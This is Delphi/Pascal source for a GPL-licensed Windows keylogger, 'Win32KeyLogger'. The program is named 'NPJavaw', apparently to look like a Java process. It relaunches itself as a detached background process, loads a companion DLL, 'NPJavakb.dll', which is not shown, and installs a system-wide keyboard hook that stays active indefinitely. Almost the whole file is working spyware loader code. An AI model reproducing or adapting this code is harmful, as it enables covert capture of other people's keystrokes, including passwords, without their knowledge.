{   
    Win32KeyLogger, a basic key logger for Windows.
    Copyright (C) 2002 David Cesarino de Sousa

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
}
program NPJavaw;

uses Windows, System;

// {$R *.RES}

var

StartupInfo : TStartupInfo;
ProcessInformation : TProcessInformation;

Hook : HHOOK;
DllInstance : DWORD;
HookProc : FARPROC;

procedure main(step: integer);
begin
  if step = 1 then begin

    GetStartupInfo(StartupInfo);
    CreateProcess(PChar(ParamStr(0)),Nil,Nil,Nil,False,
        DETACHED_PROCESS,Nil,Nil,StartupInfo,ProcessInformation);

  end else if step = 2 then begin

    DllInstance := LoadLibrary('NPJavakb.dll');
    HookProc := GetProcAddress(DllInstance, 'hookproced');
    Hook := SetWindowsHookEx(WH_KEYBOARD, HookProc, DllInstance, 0);
    Sleep(INFINITE);
    UnhookWindowsHookEx(Hook);
    FreeLibrary(DllInstance);

  end;
end;

begin

if ParamCount > 0 then main(1) else main(2);

end.
